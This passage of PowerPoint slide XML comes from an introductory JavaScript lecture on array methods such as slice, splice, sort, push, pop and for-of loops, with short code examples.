              <a:t>callback[, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>initialValue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>) executes a callback function on each member of the array resulting in a single output value.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>reverse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>() = reverses the order of elements in array</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>shift() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>= removes first element of array and returns it</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>slice</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>start</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>end</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>) = returns a slice of the original array from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>start </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>end </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>(end not included). If no </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>end </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>is given, end of array is assumed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>some</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>callback(element[, index[, array]]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>) = tests whether at least one element in the array passes the test implemented by the provided function.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>splice</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>startIndex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>howMany</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>value1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, …)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>= deletes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>howMany</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>elements from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>startIndex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> and replaces them with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>value1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>…</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2000" b="1" i="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>sort</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>sortFunction</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>) = sorts the list. If no </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>softFunction</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> is given it uses alphabetical ascending order (wrong order for numbers!)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>toString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>= returns string representation of array</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>unshift(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>value1, …</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>= add to the beginning of array</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>values() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>= returns a new Array Iterator object that contains the values for each index in the array.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="fi-FI"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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{05709038-056E-4F45-9DE7-4A1CC800D412}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Array Examples</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="98307" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1EC45FA9-0323-4C88-88F7-9BD1BCFAB0F5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1417638"/>
            <a:ext cx="10972800" cy="5069160"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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feline</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dog</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"ape"</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>0</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"cat"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arrays</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are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mutable</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n</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length</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4</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sort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 is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>now</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sorted</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>alphabetical</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order</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reverse</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reverse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the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order</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dog</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>", "cat", "ape"]</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push</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human</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insert</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human</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>" to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>the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end</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>array</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> a</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lastOne</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pop</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remove</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>return</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the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last</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element</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unshift</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insect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insert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>the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start</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firstOne</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shift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remove</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>return</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first</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item</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s</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join</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 "</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dog</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, cat, ape"</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b</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slice</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>1</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slice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from</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> 2nd </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>element</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>end</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, ["cat", "ape"]</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splice</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>0</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2</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delete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two</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elements</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from</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start</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, a=["ape"]</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>new</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Array</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>1</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2</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3</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4</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5</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using</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Array</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constructor</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c</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fill</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spam</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1</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4</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c</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[1, "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>spam</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spam</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spam</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>", 5]</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B06090202040302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1A61839C-F6A3-4467-9797-D03F460701BD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>More Array Examples</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99331" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FFFE7970-3247-467B-B10D-ECC0FBDC34CB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1417638"/>
            <a:ext cx="10972800" cy="5107706"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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React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Angular</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Vue</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The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following</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will</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print</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array</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indexes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>keys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>: 1, 2, 3</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AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>for</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>in</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same</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> as</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AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>for</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>of</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keys</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to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>print</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values</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use</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> this:</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AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>for</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value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>of</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value</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to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>enumerate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
